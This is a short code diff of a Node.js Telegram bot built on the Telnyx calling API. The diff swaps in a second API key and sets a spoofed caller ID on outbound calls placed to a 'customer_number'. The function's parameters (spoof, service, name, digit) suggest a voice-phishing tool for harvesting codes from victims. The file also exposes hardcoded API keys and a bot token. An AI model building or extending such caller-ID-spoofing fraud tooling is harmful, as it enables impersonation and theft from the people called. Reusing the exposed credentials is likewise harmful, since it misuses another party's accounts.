@@ -1,5 +1,6 @@
 // TELNYX STUFF 
 const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
+const API2 = 'KEY018C1224C1DAC10537256BCDC58B3876_XjeTzCMNqXDDsaw5EvnP7W'
 const service_number = '+14342338629'
 const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
@@ -7,7 +8,7 @@ const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 const connection_id = '2307488084473677329' //did not work
 const app_id = '2307620830302962752'
 
-const telnyx = require('telnyx')(MY_API_KEY);
+const telnyx = require('telnyx')(API2);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 var bot = new Telegraf(bot_token)
 
@@ -124,7 +125,7 @@ async function call (spoof, customer_number, ctx, service, name, digit){
          connection_id: '2307620830302962752',
          to: `+${customer_number}`,
          from: service_number,
-         from_display_name: `+${spoof}`,
+         callerId: `+${spoof}`,
          answering_machine_detection: 'detect'
       }); 
 
